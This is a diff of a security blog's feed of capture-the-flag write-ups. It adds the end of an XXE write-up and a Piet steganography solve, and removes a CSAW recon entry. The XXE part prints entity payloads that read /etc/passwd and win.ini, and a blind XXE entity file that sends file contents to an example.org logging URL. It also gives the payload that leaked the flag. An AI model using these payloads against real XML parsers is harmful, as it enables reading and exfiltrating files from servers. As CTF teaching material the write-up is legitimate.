class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
+<p>Nice that’s working so try to leak some files:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
+<p>=&gt; doesn’t work</p>
+<p>[…] and we tried a lot of logical filename on various operating systems.</p>
+<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
+<p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
+<p><code>xxe_file</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p>And a tried a lot…</p>
+<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
+<p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
+<p>Realistic challenge should have be better.</p>
+<p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
+<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
+<p>Here was the easy XXE :</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
@@ -630,6 +676,82 @@
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
       <category term="web" scheme="http://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hack The Vote 2016 - 250 - Trump likes colors - Steganography</title>
+    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/"/>
+    <id>http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/</id>
+    <published>2016-11-04T23:00:00.000Z</published>
+    <updated>2016-11-05T17:33:07.876Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><strong>Name</strong> : Hack The Vote 2016</li>
+<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
+</ul>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>Somebody leAked TrumP’s favorite colors, looks like they used a really esoteric format. Some chiNese hacker named “DanGer Mouse” provided us the leak, getting this crucial info could really sway voters at the polls!</p>
+<p><a href="https://s3.amazonaws.com/hackthevote/trump_likes_colors.bcddf8152cf2848c058310655c280a7dbb4f22fcc3687f00a26b6e9a57657dc4.png" target="_blank" rel="external">trump_likes_colors.png</a></p>
+<p>author’s irc nick: nihliphobe</p>
+</blockquote>
+<p><strong>Note</strong>: This challenge was classified as <em>Forensics</em> but is <em>Steganography</em>.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR :</strong> this is a incomplete solving, we didn’t go until the end of this challenge.</p>
+<p>The description is talking about <code>DanGer Mouse</code>, search for it, it looks like a website about esoteric languages and algorithms (<a href="http://www.dangermouse.net/esoteric/" target="_blank" rel="external">http://www.dangermouse.net/esoteric/</a>).</p>
+<p>Look at the histogram of the image:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ convert trump_likes_colors.png histogram:- | identify -format %c -</div><div class="line">    249552: (  0,  0,  0) #000000 black</div><div class="line">         1: (  0,  0,192) #0000C0 srgb(0,0,192)</div><div class="line">       102: (  0,  0,255) #0000FF blue</div><div class="line">         1: (  0,192,  0) #00C000 srgb(0,192,0)</div><div class="line">         1: (  0,192,192) #00C0C0 srgb(0,192,192)</div><div class="line">        48: (  0,255,  0) #00FF00 lime</div><div class="line">        48: (  0,255,255) #00FFFF cyan</div><div class="line">         2: (192,  0,  0) #C00000 srgb(192,0,0)</div><div class="line">         1: (192,  0,192) #C000C0 srgb(192,0,192)</div><div class="line">         1: (192,192,  0) #C0C000 srgb(192,192,0)</div><div class="line">        83: (255,  0,  0) #FF0000 red</div><div class="line">       103: (255,  0,255) #FF00FF magenta</div><div class="line">        51: (255,255,  0) #FFFF00 yellow</div><div class="line">         6: (255,255,255) #FFFFFF white</div></pre></td></tr></table></figure>
+<p>The colors used seem to be only the ones used in <a href="http://www.dangermouse.net/esoteric/piet.html" target="_blank" rel="external">PIET</a> language.</p>
+<p>There is a programm implementing PIET: <code>npiet</code>, we used it to run the programm.</p>
+<p><strong>N.B.:</strong> As we can see in the <a href="https://www.bertnase.de/npiet/picture.html" target="_blank" rel="external">gallery</a>. Vertical lines are an easy way to store a string, so our image must contain a string with the favorite color of Trump.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet trump_likes_colors.png</div><div class="line">#ff0000</div></pre></td></tr></table></figure>
+<p>So the programm gave us the favorite color of Trump:<br><code>#ff0000</code> = Red = rgb(255, 0, 0) = hsl(0, 100%, 50%).</p>
+<p>The description let us think that was that we were looking for but IRC moderators told us that was not the end.</p>
+<p>So I checked the trace of the programm:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet -t trump_likes_colors.png</div><div class="line"></div><div class="line">trace: step 0  (0,0/r,l nR -&gt; 1,0/r,l dR):</div><div class="line">action: push, value 35</div><div class="line">trace: stack (1 values): 35</div><div class="line"></div><div class="line">trace: step 1  (1,0/r,l dR -&gt; 2,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">#</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 2  (2,0/r,l nM -&gt; 3,0/r,l dM):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 3  (3,0/r,l dM -&gt; 4,0/r,l nB):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 4  (4,0/r,l nB -&gt; 5,0/r,l dB):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 5  (5,0/r,l dB -&gt; 6,0/r,l nC):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 6  (6,0/r,l nC -&gt; 7,0/r,l dC):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 7  (7,0/r,l dC -&gt; 8,0/r,l nG):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 8  (8,0/r,l nG -&gt; 9,0/r,l dG):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 9  (9,0/r,l dG -&gt; 10,0/r,l nY):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 10  (10,0/r,l nY -&gt; 11,0/r,l dY):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 11  (11,0/r,l dY -&gt; 12,0/r,l nR):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 12  (12,0/r,l nR -&gt; 13,0/r,l dR):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 13  (13,0/r,l dR -&gt; 14,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line">trace: entering white block at 16,0 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 14  (14,0/r,l nM -&gt; 16,0/r,l WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: entering white block at 16,3 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 15  (16,0/r,l WW -&gt; 16,3/d,r WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: white cell(s) crossed - continuing with no command at 14,3...</div><div class="line"></div><div class="line">trace: step 16  (16,3/d,r WW -&gt; 14,3/l,l nY):</div></pre></td></tr></table></figure>
+<p>Seems there is nothing interesting.</p>
+<p>I also genererated the image trace:</p>
+<p><img src="http://i.imgur.com/wOE90pQ.png" alt=""></p>
+<p>That only show us that char as pushed one by one, and there is not loop or conditional statements.</p>
+<p>So maybe there was something to do with the capital letters in the description?</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
+    
+    </summary>
+    
+      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
+    
+      <category term="stegano" scheme="http://rawsec.ml/tags/stegano/"/>
     
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
@@ -707,82 +829,6 @@
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
       <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hack The Vote 2016 - 250 - Trump likes colors - Steganography</title>
-    <link href="http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/"/>
-    <id>http://rawsec.ml/en/Hack-The-Vote-2016-250-trump-likes-colors/</id>
-    <published>2016-11-04T23:00:00.000Z</published>
-    <updated>2016-11-05T17:33:07.876Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : Hack The Vote 2016</li>
-<li><strong>Website</strong> : <a href="https://pwn.voting/" target="_blank" rel="external">https://pwn.voting/</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/345" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
-<p>Somebody leAked TrumP’s favorite colors, looks like they used a really esoteric format. Some chiNese hacker named “DanGer Mouse” provided us the leak, getting this crucial info could really sway voters at the polls!</p>
-<p><a href="https://s3.amazonaws.com/hackthevote/trump_likes_colors.bcddf8152cf2848c058310655c280a7dbb4f22fcc3687f00a26b6e9a57657dc4.png" target="_blank" rel="external">trump_likes_colors.png</a></p>
-<p>author’s irc nick: nihliphobe</p>
-</blockquote>
-<p><strong>Note</strong>: This challenge was classified as <em>Forensics</em> but is <em>Steganography</em>.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>TL;DR :</strong> this is a incomplete solving, we didn’t go until the end of this challenge.</p>
-<p>The description is talking about <code>DanGer Mouse</code>, search for it, it looks like a website about esoteric languages and algorithms (<a href="http://www.dangermouse.net/esoteric/" target="_blank" rel="external">http://www.dangermouse.net/esoteric/</a>).</p>
-<p>Look at the histogram of the image:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ convert trump_likes_colors.png histogram:- | identify -format %c -</div><div class="line">    249552: (  0,  0,  0) #000000 black</div><div class="line">         1: (  0,  0,192) #0000C0 srgb(0,0,192)</div><div class="line">       102: (  0,  0,255) #0000FF blue</div><div class="line">         1: (  0,192,  0) #00C000 srgb(0,192,0)</div><div class="line">         1: (  0,192,192) #00C0C0 srgb(0,192,192)</div><div class="line">        48: (  0,255,  0) #00FF00 lime</div><div class="line">        48: (  0,255,255) #00FFFF cyan</div><div class="line">         2: (192,  0,  0) #C00000 srgb(192,0,0)</div><div class="line">         1: (192,  0,192) #C000C0 srgb(192,0,192)</div><div class="line">         1: (192,192,  0) #C0C000 srgb(192,192,0)</div><div class="line">        83: (255,  0,  0) #FF0000 red</div><div class="line">       103: (255,  0,255) #FF00FF magenta</div><div class="line">        51: (255,255,  0) #FFFF00 yellow</div><div class="line">         6: (255,255,255) #FFFFFF white</div></pre></td></tr></table></figure>
-<p>The colors used seem to be only the ones used in <a href="http://www.dangermouse.net/esoteric/piet.html" target="_blank" rel="external">PIET</a> language.</p>
-<p>There is a programm implementing PIET: <code>npiet</code>, we used it to run the programm.</p>
-<p><strong>N.B.:</strong> As we can see in the <a href="https://www.bertnase.de/npiet/picture.html" target="_blank" rel="external">gallery</a>. Vertical lines are an easy way to store a string, so our image must contain a string with the favorite color of Trump.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet trump_likes_colors.png</div><div class="line">#ff0000</div></pre></td></tr></table></figure>
-<p>So the programm gave us the favorite color of Trump:<br><code>#ff0000</code> = Red = rgb(255, 0, 0) = hsl(0, 100%, 50%).</p>
-<p>The description let us think that was that we were looking for but IRC moderators told us that was not the end.</p>
-<p>So I checked the trace of the programm:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––[~/CTF/Hack_The_Vote/2016]</div><div class="line">$ npiet -t trump_likes_colors.png</div><div class="line"></div><div class="line">trace: step 0  (0,0/r,l nR -&gt; 1,0/r,l dR):</div><div class="line">action: push, value 35</div><div class="line">trace: stack (1 values): 35</div><div class="line"></div><div class="line">trace: step 1  (1,0/r,l dR -&gt; 2,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">#</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 2  (2,0/r,l nM -&gt; 3,0/r,l dM):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 3  (3,0/r,l dM -&gt; 4,0/r,l nB):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 4  (4,0/r,l nB -&gt; 5,0/r,l dB):</div><div class="line">action: push, value 102</div><div class="line">trace: stack (1 values): 102</div><div class="line"></div><div class="line">trace: step 5  (5,0/r,l dB -&gt; 6,0/r,l nC):</div><div class="line">action: out(char)</div><div class="line">f</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 6  (6,0/r,l nC -&gt; 7,0/r,l dC):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 7  (7,0/r,l dC -&gt; 8,0/r,l nG):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 8  (8,0/r,l nG -&gt; 9,0/r,l dG):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 9  (9,0/r,l dG -&gt; 10,0/r,l nY):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 10  (10,0/r,l nY -&gt; 11,0/r,l dY):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 11  (11,0/r,l dY -&gt; 12,0/r,l nR):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line"></div><div class="line">trace: step 12  (12,0/r,l nR -&gt; 13,0/r,l dR):</div><div class="line">action: push, value 48</div><div class="line">trace: stack (1 values): 48</div><div class="line"></div><div class="line">trace: step 13  (13,0/r,l dR -&gt; 14,0/r,l nM):</div><div class="line">action: out(char)</div><div class="line">0</div><div class="line">trace: stack is empty</div><div class="line">trace: entering white block at 16,0 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 14  (14,0/r,l nM -&gt; 16,0/r,l WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: entering white block at 16,3 (like the perl interpreter would)...</div><div class="line"></div><div class="line">trace: step 15  (16,0/r,l WW -&gt; 16,3/d,r WW):</div><div class="line">trace: special case: we at a white codel - continuing</div><div class="line">trace: white cell(s) crossed - continuing with no command at 14,3...</div><div class="line"></div><div class="line">trace: step 16  (16,3/d,r WW -&gt; 14,3/l,l nY):</div></pre></td></tr></table></figure>
-<p>Seems there is nothing interesting.</p>
-<p>I also genererated the image trace:</p>
-<p><img src="http://i.imgur.com/wOE90pQ.png" alt=""></p>
-<p>That only show us that char as pushed one by one, and there is not loop or conditional statements.</p>
-<p>So maybe there was something to do with the capital letters in the description?</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="stegano" scheme="http://rawsec.ml/tags/stegano/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -1137,9 +1183,9 @@
   </entry>
   
   <entry>
-    <title>CSAW CTF - 10 - Music to my ears - Reconnaissance</title>
-    <link href="http://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/"/>
-    <id>http://rawsec.ml/en/CSAW-2016-10-Music-to-my-ears-Recon/</id>
+    <title>CSAW CTF - 25 - Coinslot - Misc</title>
+    <link href="http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/"/>
+    <id>http://rawsec.ml/en/CSAW-2016-25-coinslot-misc/</id>
     <published>2016-09-17T22:00:00.000Z</published>
     <updated>2016-10-12T21:07:54.495Z</updated>
     
@@ -1166,92 +1212,14 @@
 <li><strong>Format</strong> : Jeopardy</li>
 <li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
 </ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Yo fam have you listened to my mixtape?</p>
-<p><code>user:1245880440:playlist:7bUFR2ujh1p3GfArxM0dHE</code></p>
-<p>Hint: The recon spans multiple sites.</p>
-<p>Author: breadchris</p>
-<p>Hint 2 was an image of a beet.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>Note</strong>: I didn’t finished the challenge.</p>
-<ul>
-<li>We have to look for an user and a playlist.</li>
-<li>Spotify look like to only big website to use a number id as username, so forge the URL like this:  <a href="https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE" target="_blank" rel="external">https://play.spotify.com/user/1245880440/playlist/7bUFR2ujh1p3GfArxM0dHE</a>.</li>
-<li>So we got a playlist named <strong>Awesome CTF Music Mix Vol. 1</strong>. It’s certainly the good one. The user is <strong>Chris Topher</strong>.</li>
-<li>Take the 1st letter of each songs: <strong>CHECKOUTTHELASTRADIOSTATION</strong>. What is the last radio station? A link with WGU-20 ? Last.fm ? I didn’t find.</li>
-<li>The second hint is an image of a beet so we can directly think about <a href="http://beets.io/" target="_blank" rel="external">beets.io/</a>.</li>
-<li>No more clue  to go further.</li>
-</ul>
-<p>My point of view: CTF organizers, PLEASE, stop to put this kind of useless challenges that make us loose our time and that have no link with cyber-security.</p>
-]]></content>
-    
